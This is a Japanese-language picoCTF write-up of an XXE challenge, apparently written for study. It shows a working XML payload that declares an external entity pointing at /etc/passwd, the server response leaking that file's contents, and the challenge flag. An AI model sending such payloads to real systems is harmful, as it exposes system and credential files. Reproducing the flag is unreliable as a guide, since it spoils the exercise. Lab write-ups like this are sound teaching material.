## picoCTF – XML External Entity (XXE)
# 概要

この問題では、サーバが ユーザ入力の XML をそのまま解析しており、外部エンティティ（ExternalEntity）が無効化されていないため
XXE（XML External Entity）攻撃が可能である。
## 調査
Web アプリケーションは /data エンドポイントに対して
application/xml 形式の POST リクエストを受け取り、
XML 内の <ID> 要素を処理している。
通常のリクエスト例：
POST /data HTTP/1.1
Content-Type: application/xml
```
<?xml version="1.0" encoding="UTF-8"?>
<data>
  <ID>1</ID>
</data>
```
このリクエストは正常に処理される。

## 発見
脆弱性の発見
XML の DOCTYPE 宣言が許可されているかを確認するため、
外部エンティティを定義した XML を送信した。
DOCTYPE が拒否されなかったため、
外部エンティティが有効であることを確認できた。

##　攻撃
以下の XML を送信することで、
サーバ上の /etc/passwd ファイルを外部エンティティとして読み込ませる。
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
  <ID>&xxe;</ID>
</data>
```
攻撃の仕組み
xxe という外部エンティティを定義
SYSTEM によりサーバのローカルファイルを指定
<ID> 内で &xxe; を参照
XML パーサが &xxe; を /etc/passwd の内容に展開

---
# 結果
サーバから以下のレスポンスが返却された。
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

Invalid ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_0dcf926e}
```
<ID> に指定した外部エンティティ &xxe; が展開され、
/etc/passwd の内容がエラーメッセージとして出力された。
その中にフラグが含まれていることを確認した。